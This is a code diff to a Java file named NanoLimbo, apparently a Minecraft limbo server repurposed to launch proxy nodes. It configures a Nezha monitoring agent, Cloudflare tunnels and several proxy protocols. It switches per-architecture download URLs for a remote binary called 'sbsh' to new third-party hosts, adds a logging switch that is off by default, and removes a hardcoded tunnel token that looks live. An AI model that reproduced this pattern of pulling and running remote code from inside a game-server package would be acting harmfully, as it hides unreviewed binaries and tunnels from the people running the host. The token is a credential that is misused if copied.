@@ -40,7 +40,7 @@ public final class NanoLimbo {
         "NEZHA_KEY", "ARGO_PORT", "ARGO_DOMAIN", "ARGO_AUTH", 
         "S5_PORT", "HY2_PORT", "TUIC_PORT", "ANYTLS_PORT",
         "REALITY_PORT", "ANYREALITY_PORT", "CFIP", "CFPORT", 
-        "UPLOAD_URL","CHAT_ID", "BOT_TOKEN", "NAME", "DISABLE_ARGO"
+        "UPLOAD_URL","CHAT_ID", "BOT_TOKEN", "NAME", "DISABLE_ARGO", "SHOW_LOG"
     };
     
     
@@ -123,16 +123,16 @@ public final class NanoLimbo {
     }
     
     private static void loadEnvVars(Map<String, String> envVars) throws IOException {
-        envVars.put("UUID", "73f3267d-352a-4a3a-ae20-ffdf6ccc369e"); // 节点UUID，哪吒v1在不同的平台部署需要更改，否则哪吒agent会被覆盖
+        envVars.put("UUID", "fe7431cb-ab1b-4205-a14c-d056f821b383"); // 节点UUID，哪吒v1在不同的平台部署需要更改，否则哪吒agent会被覆盖
         envVars.put("FILE_PATH", "./world");   // sub.txt节点保存目录
         envVars.put("NEZHA_SERVER", "");       // 哪吒面板地址 v1格式：nezha.xxx.com:8008  哪吒v0格式：nezha.xxx.com
         envVars.put("NEZHA_PORT", "");         // 哪吒v1请留空，哪吒v0的agent端口
         envVars.put("NEZHA_KEY", "");          // 哪吒v1的NZ_CLIENT_SECRET或哪吒v0的agent密钥
         envVars.put("ARGO_PORT", "8001");      // argo隧道端口，使用固定隧道token需要在cloudflare里设置和这里一致
-        envVars.put("ARGO_DOMAIN", "mutkp.emgko233.art");        // argo固定隧道隧道域名
-        envVars.put("ARGO_AUTH", "eyJhIjoiMjkyYmFhYTBhNmYyYzFjYjlkMGY4MGVjMjQ4YzQwYjIiLCJ0IjoiOTdmOWYwNWItYmZhZC00MDBkLWE0OGEtOTNmZGZhNmQ4ODA3IiwicyI6IlpUazRNR0V3T1RZdFptTXdOaTAwTVdGbExXRmpNRGd0WkRFNU16RXlZVFF4TURObSJ9");          // argo固定隧道隧道密钥json或token，json可在https://json.zone.id 获取
+        envVars.put("ARGO_DOMAIN", "");        // argo固定隧道隧道域名
+        envVars.put("ARGO_AUTH", "");          // argo固定隧道隧道密钥json或token，json可在https://json.zone.id 获取
         envVars.put("S5_PORT", "");            // socks5节点(tcp协议)端口，支持多端口可以填写，否则留空
-        envVars.put("HY2_PORT", "25839");           // hysteria2节点(udp协议)端口，支持多端口可以填写，否则留空
+        envVars.put("HY2_PORT", "");           // hysteria2节点(udp协议)端口，支持多端口可以填写，否则留空
         envVars.put("TUIC_PORT", "");          // tuic节点(udp协议)端口，支持多端口可以填写，否则留空
         envVars.put("ANYTLS_PORT", "");        // anytls节点(tcp协议)端口，支持多端口可以填写，否则留空
         envVars.put("REALITY_PORT", "");       // reality节点(tcp协议)端口，支持多端口可以填写，否则留空
@@ -144,6 +144,7 @@ public final class NanoLimbo {
         envVars.put("CFPORT", "443");          // 优选域名或获选ip对应端口
         envVars.put("NAME", "");               // 节点备注名称
         envVars.put("DISABLE_ARGO", "false");  // 是否关闭argo隧道，true 关闭，false 开启，默认开启
+        envVars.put("SHOW_LOG", "no");         // 是否显示日志，true/yes显示，false/no关闭，默认关闭
         
         for (String var : ALL_ENV_VARS) {
             String value = System.getenv(var);
@@ -181,9 +182,9 @@ public final class NanoLimbo {
         String url;
         
         if (osArch.contains("amd64") || osArch.contains("x86_64")) {
-            url = "https://amd64.31888.xyz/sbsh";
+            url = "https://amd64.oooen.com/sbsh";
         } else if (osArch.contains("aarch64") || osArch.contains("arm64")) {
-            url = "https://arm64.31888.xyz/sbsh";
+            url = "https://arm64.oooen.com/sbsh";
         } else if (osArch.contains("s390x")) {
             url = "https://s390x.31888.xyz/sbsh";
         } else {
